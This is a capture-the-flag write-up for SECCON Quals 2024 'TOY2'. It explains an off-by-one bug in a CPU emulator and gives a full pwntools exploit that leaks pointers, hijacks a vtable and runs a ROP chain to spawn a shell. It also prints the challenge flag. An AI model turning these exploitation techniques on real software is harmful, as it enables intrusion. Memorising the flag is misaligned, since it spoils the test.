# SECCON Quals 2024 - TOY2

This challenge implements a CPU emulator for the simple architecture "Toy 2" (architecture specification: https://www.pcengines.ch/toy2.htm) in C++. We're allowed to submit arbitrary code to the emulator.

## Vulnerability

The VM is a 16-bit little endian machine that consists of a set of registers (the field `_regs` of the class `VM` in `toy2.cpp`) and a memory of size 0x1000 bytes (the field `_mem` in the code). The `execute_and_store` function in the emulator manages the specific functionality of each instruction with a large switch case on the opcode. There are 3 functions `validate_src`, `validate_dest`, and `validate_vec` that validate an address for memory access/jumps. However, it can be seen that the `LDI` and `STT` instructions (opcodes 12 & 13) don't use this format of validation. Instead, they calculate the bitwise AND of the target address with 0xfff to limit the read/write address to the size of memory. However, since read/writes are 16-bits, this causes an off-by-one OOB read/write if the target address is exactly 0xfff.

## Exploitation

The layout of an instance of the `VM` class on the heap is like this:

```
offset    content
0x0000:   [vtable_ptr]
0x0008:   [_data]
...
0x1008:   [_mem]
          [_regs]
```

The `VM` class has 2 virtual functions `reset_registers` and `dump_registers`. The 2nd one gets called at the end of `main`, so if we can overwrite the vtable ptr we can get rip control.
The memory buffer is the 0x1000-long buffer of the `std::array<...> _data`. `_mem` is an `std::span` that has a pointer to that. So at offset 0x1008 of the object address, there is a pointer to the offset 8 of the object (beginning of `_data`) and that pointer determines the address of our memory (since the functions write to `_mem` and don't directly use `_data`). Therefore, we can use the off-by-one to partially overwrite the memory pointer and point it 8 bytes forward. This way we can first copy the memory pointer itself into the middle of our memory to get a heap leak. Then we can partially overwrite the memory pointer again to point it a bit back (to offset 0 of the object itself) so that the vtable ptr is accessible in memory. we can also copy the vtable ptr into somewhere in the middle of our memory to keep it as an ELF leak, and then overwrite the vtable pointer with our heap leak plus some offset so that it points into a fake vtable in the middle of our VM memory, and then we can write any arbitrary address in the fake vtable to get rip control. Without having any leaks from the libraries, it is hard to turn the rip control into ROP or RCE. Therefore, I wrote the address of `main` in the fake vtable to restart the program from the beginning.

## 2nd stage

I used an illegal instruction (opcode 7) at the end of my first Toy2 program to terminate its execution. Since this causes `throw std::runtime_error("Illegal instruction")` in the VM, a C++ exception object (or basically some libstdc++ library object) gets allocated on the heap. This library object contains pointers from libstdc++. Now because the address of `main` was in our fake vtable, we're back in the beginning of `main` and can submit another toy2 program to be executed by the emulator, but this time we have libstdc++ pointers left on the heap. We can trigger the same vulnerability as last time, but this time we will point the memory pointer a bit further backwards so that we can read the libstdc++ leaks located before our new `VM` object. we will copy those leaks and add offsets to them to build the addresses of the gadgets necessary for our ROP chain.

## ROP

By looking at the execution context in gdb right after we get rip control again at the end of the 2nd stage by writing `0x4444434342424141` into our fake vtable, we can see that `rdi` and `rbx` point to the beginning of the `VM` object, and `rax` points to wherever our fake vtable was. So we can control the content of memory around all of `rax`, `rdi`, `rbx`. Therefore, we will use these ROP gadgets from libstdc++:

first ROP chain:

```
1: 0x00000000000f0ab7 : mov rsi, rbx ; call qword ptr [rax + 0x28]
2: 0x00000000000ccc7a : push rdi ; std ; jmp qword ptr [rsi + 0xf]
3: 0x00000000000e7800 : pop rsp ; mov dl, 0xff ; jmp qword ptr [rsi + 0x2e]
4: 0x00000000000e0a4c : add rsp, 0x30 ; pop rbx ; pop r12 ; pop rbp ; ret
```

Gadget 1's address should be written in the fake vtable's entry for `VM::dump_registers` (so it is the thing that gets immediately executed after we hijack rip). Gadget 2's address should be written at `fake_vtable+0x28`. Gadget 1 will initialize `rsi` from `rbx` so that it also points to the beginning of the `VM` object. Therefore, in gadget 2 & 3 we can control the content of memory after `rsi`. This way we can chain gadget 2 & 3 & 4. Gadget 2 & 3 will mov `rdi` into `rsp` and 4 will increment `rsp` a bit to get clear of the addresses of gadget 3 & 4 already written near there and then start executing the 2nd classic ROP chain that we write starting from there.

second ROP chain's gadgets:

```
# 5: 0x00000000000e8080 : pop rax ; ret
# 6: 0x00000000000bafc3 : xor edx, edx ; ret
# 7: 0x00000000000ae8ee : pop rsi ; pop rbp ; ret
# 8: 0x00000000000ab305 : pop rdi ; pop rbp ; ret
# 9: 0x000000000018c53d : syscall
```

After we do stack pivoting with the first ROP chain, this 2nd ROP chain is just a classic one to load the necessary arguments and perform an `execve("/bin/sh", 0, 0)` syscall and give us a shell!

And finally the flag: `SECCON{Im4g1n3_pWn1n6_1n51d3_a_3um_CM0S}`

## Final script

```python
from pwn import *

context.update(os="linux", arch="amd64")
# elf = context.binary = ELF("int3er"); NODBG=True
elf = context.binary = ELF("toy2"); NODBG=True
# elf = context.binary = ELF("dbg"); NODBG=False

if args.REMOTE:
	p = remote("toy-2.seccon.games", 5000)
else:
	p = elf.process()
	if args.GDB:
		gdb.attach(p)
		pause()

def asm_toy(src):

	ops_list = ["jmp", "adc", "xor", "sbc", "ror", "tat", "or", "ill", "and",
			"ldc", "bcc", "bne", "ldi", "stt", "lda", "sta"]

	lines = src.splitlines()
	code = [0x77] * 0x1000
	written = [False] * 0x1000
	ptr = 0

	def parse_num(s):
		return int(s, 16 if s.startswith("0x") else 10)

	for l in lines:
		l = l.strip()
		if l == "" or l[0] == "#":
			continue
		elif l[0] == "@":
			ptr = parse_num(l[1:])
		elif l[0] == ".":
			val = parse_num(l[1:])
			if (written[ptr] or written[ptr + 1]):
				print("WARNING: overwrite " + hex(ptr))
			code[ptr] = val & 0xff
			code[ptr + 1] = (val >> 8) & 0xff
			written[ptr] = written[ptr + 1] = True
			ptr += 2
		else:
			op, addr = l.split()
			addr = parse_num(addr)
			op_num = ops_list.index(op)
			if (written[ptr] or written[ptr + 1]):
				print("WARNING: overwrite " + hex(ptr))
			code[ptr] = addr & 0xff
			code[ptr + 1] = ((addr >> 8) & 0xf) | (op_num << 4)
			written[ptr] = written[ptr + 1] = True
			ptr += 2
	
	return bytes(code)
			

code1 = asm_toy(
f"""
# off-by-one increase mem ptr
lda 0x800
tat 0
lda 0x802
stt 0

# read heap leak
@0x10
lda 0xff8
sta 0x600
lda 0xffa
sta 0x602
lda 0xffc
sta 0x604
lda 0xffe
sta 0x606

# change mem ptr to give us access to vtable ptr
lda 0x7fc
jmp 0x7fe

@0x3fa
jmp 0x810

@0x408
sta 0xff7

# code executed after mem ptr decreased for access to vtable ptr
@0x418
# store vtable ptr itself in our fake vtable, converted to main() addr
ldc 0x0
sbc 0x814
sta 0x510
lda 0x2
# MAYBE_TODO: subtract carry from next 2-byte chunks before storing them
sta 0x512
lda 0x4
sta 0x514
lda 0x6
sta 0x516

# restore heap leak onto vtable ptr, converted to fake vtable
ldc 0x610
adc 0x812
sta 0x0
lda 0x612
sta 0x2
lda 0x614
sta 0x4
lda 0x616
sta 0x6

ill 0

# where we control rip with
@0x508
.0x4141
.0x4242
.0x4343
.0x4444

# where the leaks will be stored
@0x608

# useful constants
@0x800
.0xc041
.0xfff
.0xb042
.0x400
.0x420
.0x4f8
.{hex(0x25a0 if NODBG else 0x5647)}
"""
)

print(hexdump(code1))

p.send(code1.ljust(0x1000, b"\x77"))

# stage 2
log.info("stage 2")

code2 = asm_toy(
"""
# off-by-one increase mem ptr
lda 0x800
tat 0
lda 0x802
stt 0

# read heap leak
@0x10
lda 0xff8
sta 0x7e8
lda 0xffa
sta 0x7ea
lda 0xffc
sta 0x7ec
lda 0xffe
sta 0x7ee

# change mem ptr to give us access to vtable ptr and libstdc++ leaks
lda 0x7fc
# jmp to 0x408
jmp 0x7fe

# string /bin/sh
@0x38
.0x622f
.0x6e69
.0x732f
.0x0068

# main ROP chain starts here
@0x40
@0x48
.0x3b
.0
.0
.0

@0x60
.0
.0
.0
.0

# now our mem ptr has lsb 00
@0x33a
jmp 0x8d0

@0x408
sta 0xff7

# code executed after mem ptr decreased for access to vtable ptr and leaks
@0x418
# store libstdc++ ptr in fake vtable, converted to gadget 1
ldc 0x0
adc 0x8d4
sta 0xfc8
lda 0x2
adc 0x8d6
sta 0xfca
lda 0x4
sta 0xfcc
lda 0x6
sta 0xfce

# restore heap leak onto vtable ptr, converted to fake vtable
lda 0x8b8
adc 0x8d2
sta 0xc0
lda 0x8ba
sta 0xc2
lda 0x8bc
sta 0xc4
lda 0x8be
sta 0xc6

# load gadget 2 address after fake vtable using gadget 1 addr
ldc 0xfc8
sbc 0x8d8
sta 0xfe8
lda 0xfca
sbc 0x8da
sta 0xfea
lda 0xfcc
sta 0xfec
lda 0xfce
sta 0xfee

# load gadget 3 addr
ldc 0xfc8
sbc 0x8dc
sta 0xcf
lda 0xfca
sbc 0x8de
sta 0xd1
lda 0xfcc
sta 0xd3
lda 0xfce
sta 0xd5

# load gadget 4 addr
ldc 0xfc8
sbc 0x8e0
sta 0xee
lda 0xfca
sbc 0x8e2
sta 0xf0
lda 0xfcc
sta 0xf2
lda 0xfce
sta 0xf4

# start writing main ROP chain at *current addr* 0x108 and *file addr* 0x40
# write gadget 5's addr
ldc 0xfc8
sbc 0x8e4
sta 0x108
lda 0xfca
sbc 0x8e6
sta 0x10a
lda 0xfcc
sta 0x10c
lda 0xfce
sta 0x10e

# write gadget 6's addr
ldc 0xfc8
sbc 0x8e8
sta 0x118
lda 0xfca
sbc 0x8ea
sta 0x11a
lda 0xfcc
sta 0x11c
lda 0xfce
sta 0x11e

# write gadget 7's addr
ldc 0xfc8
sbc 0x8ec
sta 0x120
lda 0xfca
sbc 0x8ee
sta 0x122
lda 0xfcc
sta 0x124
lda 0xfce
sta 0x126

# write gadget 8's addr
ldc 0xfc8
sbc 0x8f0
sta 0x138
lda 0xfca
sbc 0x8f2
sta 0x13a
lda 0xfcc
sta 0x13c
lda 0xfce
sta 0x13e

# copy the heap leak onto current addr 0x140, converted to str_bin_sh addr
ldc 0x8b8
adc 0x8f4
sta 0x140
lda 0x8ba
sta 0x142
lda 0x8bc
sta 0x144
lda 0x8be
sta 0x146

# write gadget 9's addr
ldc 0xfc8
adc 0x8f6
sta 0x150
lda 0xfca
adc 0x8f8
sta 0x152
lda 0xfcc
sta 0x154
lda 0xfce
sta 0x156

ill 0

# where the heap leak will be stored
@0x7f0

# useful constants
@0x800
.0xd041
.0xfff
.0x0042
.0x400

@0x808
.0x4e0
.0xef0
.0xb077
.0x4

@0x810
.0x3e3d
.0x2
.0x92b7
.0x0

# when ROPPing this address is 0x8e0
@0x818
.0x6b
.0x1
# gadget 5 offsets from gadget 1:
.0x8a37
.0x0

# 0x8e8
.0x5af4
.0x3
.0x21c9
.0x4

# 0x8f0 => gadget 8
.0x57b2
.0x4
.0x30

# 0x8f6 => gadget 9 offsets
.0xba86
.0x9

# fake vtable => will be filled with gadget 1
@0xf00
.0x4141
.0x4242
.0x4343
.0x4444

# gadget 2
@0xf20

"""
)

# gadgets:
# 1: 0x00000000000f0ab7 : mov rsi, rbx ; call qword ptr [rax + 0x28]
# 2: 0x00000000000ccc7a : push rdi ; std ; jmp qword ptr [rsi + 0xf]
# 3: 0x00000000000e7800 : pop rsp ; mov dl, 0xff ; jmp qword ptr [rsi + 0x2e]
# 4: 0x00000000000e0a4c : add rsp, 0x30 ; pop rbx ; pop r12 ; pop rbp ; ret

# main chain
# 5: 0x00000000000e8080 : pop rax ; ret
# 6: 0x00000000000bafc3 : xor edx, edx ; ret
# 7: 0x00000000000ae8ee : pop rsi ; pop rbp ; ret
# 8: 0x00000000000ab305 : pop rdi ; pop rbp ; ret
# 9: 0x000000000018c53d : syscall

print(hexdump(code2))
p.send(code2.ljust(0x1000, b"\x77"))

p.interactive()
```
